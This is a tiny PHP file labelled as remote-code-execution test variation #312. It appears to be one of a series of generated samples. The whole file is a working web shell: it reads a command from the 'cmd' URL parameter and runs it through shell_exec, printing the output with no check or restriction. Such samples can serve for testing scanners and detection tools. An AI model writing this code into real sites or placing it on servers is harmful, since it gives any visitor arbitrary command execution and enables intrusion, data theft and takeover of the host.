<?php
// RCE test variation #312
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>